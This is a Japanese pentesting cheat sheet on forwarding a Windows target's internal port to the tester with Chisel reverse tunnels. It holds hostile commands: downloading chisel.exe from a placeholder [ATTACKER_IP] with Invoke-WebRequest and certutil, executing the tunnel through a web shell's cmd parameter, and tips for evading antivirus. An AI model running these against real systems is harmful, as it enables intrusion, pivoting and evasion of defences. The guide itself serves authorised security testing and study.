# Chisel — ポートフォワーディング

Chisel（Go製のTCPトンネリングツール）を使って、ターゲット内部でしかアクセスできないポートをテスター端末に転送する手法。

---

## ポートフォワーディング（リバーストンネル）

### 着火条件

- ターゲットマシンで `netstat` 等により **ローカルにしかリスニングしていないポート**（`127.0.0.1:[PORT]`）が見つかった
- そのサービスに直接アクセスしてエクスプロイトを実行したい（buffer overflow・Exploit-DB PoC 等）
- ターゲットからテスター端末への **アウトバウンド接続が可能**（Reverse モードの前提）

> **着火シグナル：** `netstat -ano | findstr ":0"` で `127.0.0.1:[PORT]` の LISTENING が見えたとき。
> Chisel のリバーストンネルを使えばそのポートをテスター端末に転送し、`localhost:[PORT]` として攻撃できる。

### 環境前提

- 実行環境: テスター端末（サーバー起動）＋ ターゲット（クライアント起動）
- 必要なツール: `chisel`（ペネトレ用Linuxディストリに標準搭載のことが多い。なければ `apt install chisel` / GitHub Release から取得）
- Windows 用バイナリ: GitHub Release から `chisel_[バージョン]_windows_amd64.gz` を取得して解凍
- オフライン環境: テスター端末でビルド済みバイナリをターゲットに転送する（`python3 -m http.server` + `IWR` 等）

### 観点・着眼点

**攻撃者の思考トレース：** エクスプロイトは「接続先が `127.0.0.1:[PORT]`」を前提にしている場合が多い。
Chisel のリバーストンネルを使えば、テスター端末の `127.0.0.1:[FORWARD_PORT]` に接続するだけでターゲット内部のサービスに届く。
エクスプロイトスクリプトの接続先を変える必要がなくなる（`target = "127.0.0.1"` のままで動く）。

**リバーストンネルの仕組み：**
```
テスター端末                  ターゲット
[chisel server :9999]  ←接続←  [chisel.exe client]
   ↑
[localhost:8888] → トンネル → [127.0.0.1:8888 on target]
```

### 手順

**事前準備（必須）：** Chisel バイナリをターゲットに転送しておく。

```bash
# [Attacker] Linux 用（サーバー）は標準搭載 or apt install
which chisel || sudo apt install chisel -y

# [Attacker] Windows 用バイナリを取得して解凍
wget https://github.com/jpillora/chisel/releases/download/v1.10.1/chisel_1.10.1_windows_amd64.gz
gunzip chisel_1.10.1_windows_amd64.gz
# → chisel_1.10.1_windows_amd64 （実行ファイル）

# [Attacker] HTTP サーバーで配信
python3 -m http.server 80
# テスター側の到達可能インターフェース（環境による: ip a で確認）のIPを使う
```

```powershell
# [Target] Webシェルや既存シェルから Windows にダウンロード
Invoke-WebRequest -Uri "http://[ATTACKER_IP]/chisel_1.10.1_windows_amd64" -OutFile "C:\Users\Public\chisel.exe"
# または certutil（PowerShell が制限されている場合）
certutil -urlcache -f http://[ATTACKER_IP]/chisel_1.10.1_windows_amd64 C:\Users\Public\chisel.exe
```

**Step 1: テスター端末でサーバーを起動**

```bash
# [Attacker] リバーストンネルを受け付けるサーバーを起動
chisel server -p 9999 --reverse
# → "Listening on http://0.0.0.0:9999" が出たら準備完了
```

**Step 2: ターゲットでクライアントを実行してトンネルを確立**

```powershell
# [Target] リバーストンネルを確立 → ターゲットの 127.0.0.1:8888 をテスター端末の localhost:8888 に転送
C:\Users\Public\chisel.exe client [ATTACKER_IP]:9999 R:8888:127.0.0.1:8888
# R:[転送先ポート]:[転送元ホスト]:[転送元ポート]
```

**Step 3: トンネルの確立確認**

テスター端末のサーバー側の出力に以下が出れば確立済み：
```
server: session#1: tun: proxy#R:8888=>8888: Listening
```

バージョン差異の警告が出ても動作することが多い：
```
server: session#1: Client version (1.10.1) differs from server version (...)
```

**Step 4: テスター端末からターゲット内部サービスにアクセス**

```bash
# [Attacker] localhost:8888 に接続すればターゲットの内部サービスに届く
# エクスプロイトスクリプトの接続先を localhost (127.0.0.1) のまま実行できる
python3 exploit.py   # target = "127.0.0.1" のまま動く
```

### 刺さらなかったとき

| 症状 | 原因の推定 | 次のアクション |
|------|----------|--------------|
| クライアントがサーバーに接続できない | ファイアウォールがアウトバウンドをブロック / ポートが閉じている | 別ポート（80・443 等、通常開いているポート）でサーバーを起動して再試行 |
| バイナリを実行してもすぐ終了する | アンチウイルスが検知・削除 | 別のディレクトリに配置 / 別バージョンを試す |
| トンネルが確立するが通信できない | ターゲット側で対象ポートが動いていない | `netstat -ano` で再確認してポート番号を修正 |
| chisel.exe が実行できない（32bit環境） | アーキテクチャ不一致 | `[Target] systeminfo` で CPU 情報を確認して 32bit 版を使用 |

### 注意点・落とし穴

- **ポートの競合：** テスター端末で既に `8888` が使われている場合は `R:8889:127.0.0.1:8888` のように転送先を変える
- **バージョン一致推奨：** サーバーとクライアントのバージョンは合わせておく方が安定する
- **AV 検知：** Windows Defender 等が chisel.exe を検知することがある。`C:\Windows\Temp`・`C:\Users\Public` 等に置いて試す
- Webシェルを通じてクライアントコマンドを実行する場合、バックグラウンド実行が必要：
  ```bash
  # Webシェル経由で実行する場合（バックグラウンドで起動）
  curl "http://[TARGET]/upload/shell.php?cmd=C:\Users\Public\chisel.exe+client+[ATTACKER_IP]:9999+R:8888:127.0.0.1:8888"
  # → レスポンスが返ってこない（トンネル維持中）ため、テスター端末のサーバー出力でトンネル確立を確認する
  ```

### 関連技術

- 前：ローカルポートの発見（netstat） → `../04_Post_Access_Windows_AD/Enumeration_Checklist.md`（Step 1.5）
- 後：転送したポートへの Buffer Overflow 攻撃 → `../04_Post_Access_Windows_AD/Buffer_Overflow_LocalService.md`
